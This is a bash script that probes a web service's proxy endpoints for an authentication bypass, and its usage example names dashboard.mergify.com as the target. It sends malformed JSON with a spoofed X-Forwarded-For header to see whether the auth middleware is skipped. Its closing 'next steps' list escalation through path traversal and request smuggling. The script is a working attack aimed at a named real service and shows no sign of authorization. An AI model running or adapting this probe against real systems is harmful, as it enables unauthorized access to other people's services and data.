#!/usr/bin/env bash
# proxy-auth-bypass-probe.sh
# Quick probe for middleware ordering auth bypass on SPA proxy endpoints
# Usage: ./proxy-auth-bypass-probe.sh <base_url> <proxy_path>
# Example: ./proxy-auth-bypass-probe.sh https://dashboard.mergify.com /front/proxy/engine/v1/repos/test/test/conditions-evaluation

set -euo pipefail

BASE_URL="${1:-}"
PROXY_PATH="${2:-}"

if [[ -z "$BASE_URL" || -z "$PROXY_PATH" ]]; then
    echo "Usage: $0 <base_url> <proxy_path>"
    echo "Example: $0 https://dashboard.mergify.com /front/proxy/engine/v1/repos/test/test/conditions-evaluation"
    exit 1
fi

FULL_URL="${BASE_URL}${PROXY_PATH}"
CLEAN_BODY='{"test": "clean"}'
MALFORMED_BODY='{"test": "value\nwith newline"}'

echo "========================================"
echo "PROXY AUTH BYPASS PROBE"
echo "Target: $FULL_URL"
echo "========================================"
echo

# Test 1: Clean request (baseline)
echo "[1] Clean request (baseline)..."
CLEAN_RESP=$(curl -s -k -X POST "$FULL_URL" \
    -H "Content-Type: application/json" \
    -d "$CLEAN_BODY" \
    -w "\n%{http_code}")
CLEAN_CODE=$(echo "$CLEAN_RESP" | tail -1)
CLEAN_BODY_RESP=$(echo "$CLEAN_RESP" | head -n -1)
echo "    HTTP $CLEAN_CODE | $CLEAN_BODY_RESP"

# Test 2: Malformed request (control char)
echo "[2] Malformed request (literal newline in JSON)..."
MALFORMED_RESP=$(curl -s -k -X POST "$FULL_URL" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 127.0.0.1" \
    -d "$MALFORMED_BODY" \
    -w "\n%{http_code}")
MALFORMED_CODE=$(echo "$MALFORMED_RESP" | tail -1)
MALFORMED_BODY_RESP=$(echo "$MALFORMED_RESP" | head -n -1)
echo "    HTTP $MALFORMED_CODE | $MALFORMED_BODY_RESP"

# Test 3: Malformed without XFF
echo "[3] Malformed request (no XFF)..."
NO_XFF_RESP=$(curl -s -k -X POST "$FULL_URL" \
    -H "Content-Type: application/json" \
    -d "$MALFORMED_BODY" \
    -w "\n%{http_code}")
NO_XFF_CODE=$(echo "$NO_XFF_RESP" | tail -1)
NO_XFF_BODY_RESP=$(echo "$NO_XFF_RESP" | head -n -1)
echo "    HTTP $NO_XFF_CODE | $NO_XFF_BODY_RESP"

echo
echo "========================================"
echo "ANALYSIS"
echo "========================================"

if [[ "$CLEAN_CODE" == "403" || "$CLEAN_CODE" == "401" ]]; then
    echo "✓ Baseline auth works (clean request -> $CLEAN_CODE)"
else
    echo "⚠ Baseline unexpected: clean request -> $CLEAN_CODE"
fi

if [[ "$MALFORMED_CODE" == "422" && "$MALFORMED_BODY_RESP" == *'input": {}'* ]]; then
    echo "🔴 AUTH BYPASS CONFIRMED: Malformed + XFF -> 422 with empty input!"
    echo "    This indicates JSON parser crashed, consumed body, skipped auth middleware."
    echo "    Request reached backend API with empty body."
elif [[ "$MALFORMED_CODE" == "422" ]]; then
    echo "⚠ Malformed -> 422 but input not empty. Check if parser error handling differs."
elif [[ "$MALFORMED_CODE" == "403" || "$MALFORMED_CODE" == "401" ]]; then
    echo "✓ No bypass: Malformed request still blocked by auth ($MALFORMED_CODE)"
else
    echo "? Malformed -> $MALFORMED_CODE (unexpected)"
fi

if [[ "$NO_XFF_CODE" == "422" && "$NO_XFF_BODY_RESP" == *'input": {}'* ]]; then
    echo "🔴 XFF NOT REQUIRED: Bypass works without X-Forwarded-For header!"
fi

echo
echo "NEXT STEPS:"
echo "  1. Test other control chars: \t, \r, \u0000"
echo "  2. Test path traversal variants: ../../../engine/v1/..."
echo "  3. Find endpoint without body requirement (GET/HEAD with query)"
echo "  4. Attempt request smuggling to send valid body after bypass"